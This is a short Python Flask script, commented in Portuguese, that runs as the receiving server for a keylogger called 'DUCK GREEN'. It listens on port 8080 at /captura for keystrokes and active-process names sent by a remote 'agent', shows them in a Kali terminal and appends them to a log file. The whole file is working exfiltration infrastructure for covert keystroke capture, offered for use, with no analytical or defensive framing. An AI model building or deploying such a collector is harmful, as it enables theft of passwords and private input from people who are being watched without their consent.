from flask import Flask, request
import datetime
import os

app = Flask(__name__)

# Configuração de Cores para o terminal (Estilo Matrix/Hacker)
GREEN = '\033[0;32m'
BLUE = '\033[0;34m'
YELLOW = '\033[1;33m'
RED = '\033[0;31m'
NC = '\033[0m'  # No Color


@app.route('/captura', methods=['POST'])
def receive():
    try:
        # Recebe o JSON enviado pelo agente
        data = request.json
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        teclas = data.get('tecla', '')
        processo = data.get('processo', 'DESCONHECIDO')

        # Exibe no terminal do Kali de forma organizada
        print(f"\n{BLUE}[{timestamp}]{NC} Atividade em: {YELLOW}{processo}{NC}")
        print(f"{GREEN}>>{NC} {teclas}")
        print(f"{BLUE}{'=' * 50}{NC}")

        # Salva num ficheiro de texto para não perderes nada
        with open("logs_duck_green.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{processo}] {teclas}\n")

        return "OK", 200
    except Exception as e:
        print(f"{RED}[!] Erro ao receber dados: {e}{NC}")
        return "Erro", 500


if __name__ == '__main__':
    os.system('clear')
    print(f"""{GREEN}
    --------------------------------------------------
             DUCK GREEN - RECEPTOR DE LOGS
    --------------------------------------------------{NC}""")
    print(f"[*] Escutando em: {YELLOW}http://0.0.0.0:8080/captura{NC}")
    print(f"[*] Logs serão salvos em: {BLUE}logs_duck_green.txt{NC}")
    print("-" * 50)

    # Inicia o servidor Flask na porta 8080
    app.run(host='0.0.0.0', port=8080)